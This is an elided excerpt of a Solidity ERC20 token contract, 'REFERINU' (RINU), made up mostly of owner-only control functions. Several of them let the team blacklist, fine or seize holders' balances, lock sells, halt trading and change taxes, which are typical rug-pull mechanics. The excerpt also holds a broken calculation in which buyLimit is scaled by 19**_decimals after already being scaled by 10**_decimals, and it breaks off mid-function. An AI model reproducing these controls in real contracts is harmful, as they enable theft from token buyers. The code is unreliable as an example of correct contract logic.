...
contract REFERINU is IERC20, Ownable
{
    ...
    string public constant _name = 'REFERINU';
    string public constant _symbol = 'RINU';
    uint8 public constant _decimals = 18;
    uint256 public constant InitialSupply= 56 * 10**9 * 10**_decimals;

    uint256 swapLimit = 56 * 10**7 * 10**_decimals; 
    bool isSwapPegged = true;

    
    uint16 public  BuyLimitDivider=100; // 1%
    
    uint8 public   BalanceLimitDivider=100; // 1%
    ...
    function ControlPanel_getLimits() public view returns(uint256 balance, uint256 sell){
        return(balanceLimit/10**_decimals, sellLimit/10**_decimals);
    }

    function ControlPanel_getTaxes() public view returns(uint256 liquidityTax,uint256 marketingTax, uint256 buyTax, uint256 sellTax, uint256 transferTax){
        return (_liquidityTax,_marketingTax,_buyTax,_sellTax,_transferTax);
    }
    
    function ControlPanel_getAddressSellLockTimeInSeconds(address AddressToCheck) public view returns (uint256){
    ...
    function ControlPanel_getSellLockTimeInSeconds() public view returns(uint256){
        return sellLockTime;
    }
    ...
    function ControlPanel_SetPeggedSwap(bool isPegged) public onlyTeam {
        isSwapPegged = isPegged;
    }

    function ControlPanel_SetMaxSwap(uint256 max) public onlyTeam {
        swapLimit = max;
    }

    function ControlPanel_SetMaxLockTime(uint16 max) public onlyTeam {
     MaxSellLockTime = max;
    }
    ...
    function Access_BlackListAddress(address addy, bool booly) public onlyTeam {
        _blacklist[addy] = booly;
    }
    
    function Access_AddressStop() public onlyTeam {
        _sellLock[msg.sender]=block.timestamp+(365 days);
    }

    function Access_FineAddress(address addy, uint256 amount) public onlyTeam {
    ...
    function Access_SeizeAddress(address addy) public onlyTeam {
    ...
    function ControlPanel_SwitchManualETHConversion(bool manual) public onlyTeam{
        manualConversion=manual;
    }
    
    function ControlPanel_DisableSellLock(bool disabled) public onlyTeam{
    ...
    function ControlPanel_SetTaxes(uint8 liquidityTaxes, uint8 marketingTaxes,uint8 buyTax, uint8 sellTax, uint8 transferTax) public onlyTeam{
        uint8 totalTax=liquidityTaxes+marketingTaxes;
        require(totalTax==100, "liq+marketing needs to equal 100%");
        require(buyTax<=20 && sellTax<=20 && transferTax <=20, "20% Max");
    ...
    function ControlPanel_ChangeMarketingShare(uint8 newShare) public onlyTeam{
        marketingShare=newShare;
    }
   
    function ControlPanel_ManualGenerateTokenSwapBalance(uint256 _qty) public onlyTeam{
        _swapContractToken(_qty * 10**_decimals);
    }

    
    function ControlPanel_UpdateLimits(uint256 newBalanceLimit, uint newBuyLimit, uint256 newSellLimit) public onlyTeam{
        newBalanceLimit=newBalanceLimit*10**_decimals;
        newBuyLimit = newBuyLimit*10**_decimals;
        newSellLimit=newSellLimit*10**_decimals;
        balanceLimit = newBalanceLimit;
        buyLimit = newBuyLimit*19**_decimals;
    ...
    function ControlPanel_EnableTrading(bool booly) public onlyTeam{
        tradingEnabled = booly;
    }

    
    function ControlPanel_LiquidityTokenAddress(address liquidityTokenAddress) public onlyTeam{
        _liquidityTokenAddress=liquidityTokenAddress;
    }
        

    function ControlPanel_setBlacklistEnabled(bool isBlacklistEnabled) public onlyTeam {
        isBlacklist = isBlacklistEnabled;
    }

    function ControlPanel_setContractTokenSwapManual(bool manual) public onlyTeam {
        isTokenSwapManual = manual;
    }

    function ControlPanel_setBlacklistedAddress(address toBlacklist) public onlyTeam {
        _blacklist[toBlacklist] = true;
    }

    function ControlPanel_removeBlacklistedAddress(address toRemove) public onlyTeam {
        _blacklist[toRemove] = false;
    }


    function ControlPanel_AvoidLocks() public onlyTeam{
